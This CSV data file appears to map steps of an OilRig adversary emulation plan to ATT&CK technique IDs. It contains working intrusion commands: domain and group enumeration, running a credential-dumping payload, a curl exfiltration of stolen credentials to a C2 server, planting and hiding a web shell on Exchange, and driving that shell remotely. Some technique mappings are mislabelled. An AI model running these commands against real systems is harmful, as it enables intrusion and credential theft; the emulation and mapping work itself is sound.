org_name,plan_id,scenario_id,step_id,step_order,step_title,step_text,attack_technique_ids_raw,attack_technique_ids_parent,source_file,mapping_method,mapping_quality
oilrig,oilrig,unknown,oilrig::11,11,OilRig Domain Account Discovery,id: 13d5ab62-c05a-4d25-bd8f-e3b27a5be611 | name: OilRig Domain Account Discovery | description: The net utility is executed via cmd to enumerate domain user accounts. | tactic: Discovery | technique: attack_id: T1087.002 | name: Account Discovery: Domain Account | procedure_group: procedure_discovery | procedure_step: 2.A.5 | platforms: windows: cmd: command: net user /domain,"[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::12,12,Account Discovery: Domain Account,attack_id: T1087.002 | name: Account Discovery: Domain Account,"[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::13,13,OilRig Group Account Discovery,id: e0b534a6-bff3-4964-8f7b-863ddee224b0 | name: OilRig Group Account Discovery | description: The net utility is executed via cmd to enumerate group accounts. | tactic: Discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 2.A.6 | platforms: windows: cmd: command: net group /domain,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::14,14,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::15,15,"OilRig ""domain admins"" Group Discovery","id: 3d450711-1062-4276-8bff-bb78ec4f4519 | name: OilRig ""domain admins"" Group Discovery | description: The net utility is executed via cmd to enumerate the ""domain admins"" group | tactic: Discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 2.A.7 | platforms: windows: cmd: command: net group ""domain admins"" /domain","[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::16,16,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::17,17,"OilRig ""Exchange Trusted Subsystem"" Group Discovery","id: 29c018ed-eb3e-4ddb-90ec-ba3d928a00e8 | name: OilRig ""Exchange Trusted Subsystem"" Group Discovery | description: The net utility is executed via cmd to enumerate the ""Exchange Trusted Subsystem"" group | tactic: Discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 2.A.8 | platforms: windows: cmd: command: net group ""Exchange Trusted Subsystem"" /domain","[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::18,18,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::19,19,OilRig List domain account settings,id: 41ce9dd8-dc9f-4fba-8ce9-9ef5aaee3d19 | name: OilRig List domain account settings | description: View domain account settings and password policy | tactic: Discovery | technique: attack_id: T1021 | name: Password Policy Discovery | procedure_group: procedure_discovery | procedure_step: 2.A.9 | platforms: windows: cmd: command: net accounts /domain,"[""T1021""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::20,20,Password Policy Discovery,attack_id: T1021 | name: Password Policy Discovery,"[""T1021""]","[""T1021""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::21,21,OilRig Local Account Discovery,id: 821fd81e-2086-4ea6-b792-fb9e044e2323 | name: OilRig Local Account Discovery | description: Enumerate user accounts | tactic: Discovery | technique: attack_id: T1087.001 | name: Account Discovery: Local Account | procedure_group: procedure_discovery | procedure_step: 2.A.10 | platforms: windows: cmd: command: net user,"[""T1087.001""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::22,22,Account Discovery: Local Account,attack_id: T1087.001 | name: Account Discovery: Local Account,"[""T1087.001""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::23,23,"OilRig ""administrators"" local group discovery","id: ae4e4c08-82cb-4a17-a873-660f851a1a38 | name: OilRig ""administrators"" local group discovery | description: View the details and members of the ""administrators"" local group | tactic: Discovery | technique: attack_id: T1069.001 | name: Permission Groups Discovery: Local Groups | procedure_group: procedure_discovery | procedure_step: 2.A.11 | platforms: windows: cmd: command: net localgroup administrators","[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::24,24,Permission Groups Discovery: Local Groups,attack_id: T1069.001 | name: Permission Groups Discovery: Local Groups,"[""T1069.001""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::25,25,OilRig View Network Connections,id: cb8e9faa-ac00-48d8-a359-88044a2c0252 | name: OilRig View Network Connections | description: Find system network connections | tactic: Discovery | technique: attack_id: T1049 | name: System Network Connections Discovery | procedure_group: procedure_discovery | procedure_step: 2.A.12 | platforms: windows: cmd: command: netstat -na,"[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::26,26,System Network Connections Discovery,attack_id: T1049 | name: System Network Connections Discovery,"[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::27,27,OilRig Process discovery,id: de39f574-f6cc-4026-973e-c5370b36220b | name: OilRig Process discovery | description: View running processes on system | tactic: Discovery | technique: attack_id: T1057 | name: Process Discovery | procedure_group: procedure_discovery | procedure_step: 2.A.13 | platforms: windows: cmd: command: tasklist,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::28,28,Process Discovery,attack_id: T1057 | name: Process Discovery,"[""T1057""]","[""T1057""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::29,29,OilRig System Service Discovery,id: e6eb7d18-606e-4889-8924-f75cafa92811 | name: OilRig System Service Discovery | description: Gather information about registered local system services | tactic: Discovery | technique: attack_id: T1007 | name: System Service Discovery | procedure_group: procedure_discovery | procedure_step: 2.A.14 | platforms: windows: cmd: command: sc query,"[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::30,30,System Service Discovery,attack_id: T1007 | name: System Service Discovery,"[""T1007""]","[""T1007""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::31,31,OilRig System Information Discovery,id: 178bb431-4eaf-43b1-922c-f484ab54bbee | name: OilRig System Information Discovery | description: Gather detailed system information | tactic: Discovery | technique: attack_id: T1082 | name: System Information Discovery | procedure_group: procedure_discovery | procedure_step: 2.A.15 | platforms: windows: cmd: command: systeminfo,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::32,32,System Information Discovery,attack_id: T1082 | name: System Information Discovery,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::33,33,OilRig Query Registry,"id: 09502b3c-7541-4c11-92a9-f55e683a6355 | name: OilRig Query Registry | description: Query the Windows registry key HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default | tactic: Discovery | technique: attack_id: T1012 | name: Query Registry | procedure_group: procedure_discovery | procedure_step: 2.A.16 | platforms: windows: cmd: command: reg query ""HKEY_CURRENT_USER\Software\Microsoft\Terminal Server Client\Default""","[""T1012""]","[""T1012""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::34,34,Query Registry,attack_id: T1012 | name: Query Registry,"[""T1012""]","[""T1012""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::35,35,"OilRig Targeted ""Gosta"" Account Discovery","id: 7971246d-1392-411e-a803-a7946cf9e4d2 | name: OilRig Targeted ""Gosta"" Account Discovery | description: The net utility is executed via cmd to enumerate detailed information about the Gosta user account | tactic: Discovery | technique: attack_id: T1087.002 | name: Account Discovery: Domain Account | procedure_group: procedure_discovery | procedure_step: 2.A.17 | platforms: windows: cmd: command: net user #{initial.target.user} /domain
 | input_arguments: initial.target.user: description: The username of the target host for initial access. | type: string | default: gosta","[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::36,36,Account Discovery: Domain Account,attack_id: T1087.002 | name: Account Discovery: Domain Account,"[""T1087.002""]","[""T1087""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::37,37,"OilRig ""SQL Admins"" Group Discovery","id: 6a7b4ba0-a9bb-451d-ba9f-d3a2e8a82ffe | name: OilRig ""SQL Admins"" Group Discovery | description: The net utility is executed via cmd to enumerate the ""SQL Admins"" group | tactic: Discovery | technique: attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups | procedure_group: procedure_discovery | procedure_step: 2.A.18 | platforms: windows: cmd: command: net group ""SQL Admins"" /domain","[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::38,38,Permission Groups Discovery: Domain Groups,attack_id: T1069.002 | name: Permission Groups Discovery: Domain Groups,"[""T1069.002""]","[""T1069""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::39,39,OilRig nslookup WATERFALLS,"id: f9f1bd68-ec0a-47e7-8645-210844190d92 | name: OilRig nslookup WATERFALLS | description: Perform DNS lookup for WATERFALLS | tactic: Discovery | technique: attack_id: T1018 | name: Remote System Discovery | procedure_group: procedure_discovery | procedure_step: 2.A.19 | platforms: windows: cmd: command: nslookup #{second.target.host}
 | input_arguments: second.target.host: description: The hostname address of the second target host. | type: string | default: WATERFALLS","[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::40,40,Remote System Discovery,attack_id: T1018 | name: Remote System Discovery,"[""T1018""]","[""T1018""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::41,41,OilRig Dump Credentials from Windows Credential Manager,"id: a23fb84f-dfb7-4d07-a6ec-0352ae983651 | name: OilRig Dump Credentials from Windows Credential Manager | description: Create a SQLite database with output of Windows Credential Value for Internet Explorer
 | tactic: credential-access | technique: attack_id: T1555.004 | name: Credentials from Password Stores: Windows Credential Manager | procedure_group: procedure_credential_access | procedure_step: 3.A.2 | platforms: windows: cmd: command: C:\Users\#{initial.target.user}\AppData\local\SystemFailureReporter\b.exe
 | payloads: b.exe","[""T1555.004""]","[""T1555""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::42,42,Credentials from Password Stores: Windows Credential Manager,attack_id: T1555.004 | name: Credentials from Password Stores: Windows Credential Manager,"[""T1555.004""]","[""T1555""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::43,43,OilRig Exfil fsociety.dat,"id: 021245dd-c0be-4900-bd6c-1c680f00a237 | name: OilRig Exfil fsociety.dat | description: Exfil the SQLite database fsociety.dat created by b.exe | tactic: exfiltration | technique: attack_id: T1041 | name: Exfiltration Over C2 Channel | procedure_group: procedure_exfiltration | procedure_step: 3.A.3 | platforms: windows: cmd: command: curl -F ""data=@C:\Users\#{initial.target.user}\AppData\Roaming\fsociety.dat"" --header ""X-Request-ID: #{initial.target.user}-#{paw}"" #{server}/file/upload
","[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::44,44,Exfiltration Over C2 Channel,attack_id: T1041 | name: Exfiltration Over C2 Channel,"[""T1041""]","[""T1041""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::45,45,OilRig Copy webshell to THEBLOCK,"id: 2f3be960-5c00-4f03-a9c2-da09c31d38d9 | name: OilRig Copy webshell to THEBLOCK | description: SystemFailureReporter.exe downloads contact.aspx
 | tactic: Command and Control | technique: attack_id: T1105 | name: Ingress Tool Transfer | procedure_group: procedure_discovery | procedure_step: 4.A.1 | platforms: windows: cmd: command: copy  C:\Users\#{initial.target.user}\AppData\Local\SystemFailureReporter\contact.aspx C:\Users\Public\contact.aspx
 | payloads: contact.aspx","[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::46,46,Ingress Tool Transfer,attack_id: T1105 | name: Ingress Tool Transfer,"[""T1105""]","[""T1105""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::47,47,OilRig Copy webshell to WATERFALLS,"id: 7aaecfb7-a1eb-477c-8d53-ab3009389623 | name: OilRig Copy webshell to WATERFALLS | description: contact.aspx is copied from THEBLOCK to WATERFALL to the Exchange Web Services directory. This ability implements Step 4.A.3.  
 | tactic: persistence | technique: attack_id: T1505.003 | name: Server Software Component: Web Shell | procedure_group: procedure_persistence | procedure_step: 4.A.2 | platforms: windows: cmd: command: copy C:\Users\Public\contact.aspx ""\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\""
 | input_arguments: second.target.ip: description: The IPv4 address of the Exchange server. | type: string | default: 10.1.0.6","[""T1505.003""]","[""T1505""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::48,48,Server Software Component: Web Shell,attack_id: T1505.003 | name: Server Software Component: Web Shell,"[""T1505.003""]","[""T1505""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::49,49,OilRig Set file hidden attribute,"id: 5f7dc4b3-1287-4a25-b0b0-b6e73756cc11 | name: OilRig Set file hidden attribute | description: Set file hidden attribute for contact.aspx on WATERFALLS
 | tactic: defense-evasion | technique: attack_id: T1082 | name: Hide Artifacts: Hidden Files & Directories | procedure_group: procedure_defense_evasion | procedure_step: 4.A.4 | platforms: windows: cmd: command: attrib +h ""\\#{second.target.ip}\C$\Program Files\Microsoft\Exchange Server\V15\ClientAccess\exchweb\ews\contact.aspx""","[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::50,50,Hide Artifacts: Hidden Files & Directories,attack_id: T1082 | name: Hide Artifacts: Hidden Files & Directories,"[""T1082""]","[""T1082""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::51,51,OilRig Current User (Kali Agent),"id: 87d3322b-a435-47b5-9f97-a8db4f86dad5 | name: OilRig Current User (Kali Agent) | description: Attacker machine obtains user from current session gosta's current session on 10.1.0.6 | tactic: discovery | technique: attack_id: T1033 | name: System Owner/User Discovery | procedure_group: procedure_discovery | procedure_step: 5.A.2 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=whoami"" https://#{second.target.ip}/ews/contact.aspx
 | input_arguments: initial.target.password: description: The password of the target host for initial access. | type: string | default: d0ntGoCH4ingW8trfalls | network.domain.name: description: Network domain name for initial target system. | type: string | default: boom.box","[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::52,52,System Owner/User Discovery,attack_id: T1033 | name: System Owner/User Discovery,"[""T1033""]","[""T1033""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::53,53,OilRig Network Interface Configuration (Kali Agent),"id: 48927544-5a18-11ed-9b6a-0242ac120002 | name: OilRig Network Interface Configuration (Kali Agent) | description: Attacker machine views network configuration information for gosta on 10.1.0.6 | tactic: Discovery | technique: attack_id: T1016 | name: System Network Configuration Discovery | procedure_group: procedure_discovery | procedure_step: 5.A.3 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=ipconfig /all"" https://#{second.target.ip}/ews/contact.aspx
","[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::54,54,System Network Configuration Discovery,attack_id: T1016 | name: System Network Configuration Discovery,"[""T1016""]","[""T1016""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::55,55,OilRig View Network Connections (Kali Agent),"id: 5c279562-a004-4d9c-9ec6-a7dc4997f699 | name: OilRig View Network Connections (Kali Agent) | description: Attacker machine views system network connections for gosta on 10.1.0.6 | tactic: Discovery | technique: attack_id: T1049 | name: System Network Connections Discovery | procedure_group: procedure_discovery | procedure_step: 5.A.4 | platforms: linux: sh: command: curl -s --http1.1 --ntlm -u '#{network.domain.name}\#{initial.target.user}:#{initial.target.password}' -k -X POST --data ""pro=cmd.exe"" --data ""cmd=netstat -an"" https://#{second.target.ip}/ews/contact.aspx
","[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
oilrig,oilrig,unknown,oilrig::56,56,System Network Connections Discovery,attack_id: T1049 | name: System Network Connections Discovery,"[""T1049""]","[""T1049""]",E:\desktop\project_only\project\data_v2\external_ctid\raw\adversary_emulation_library-master\oilrig\Emulation_Plan\yaml\oilrig.yaml,yaml_regex_extract,high
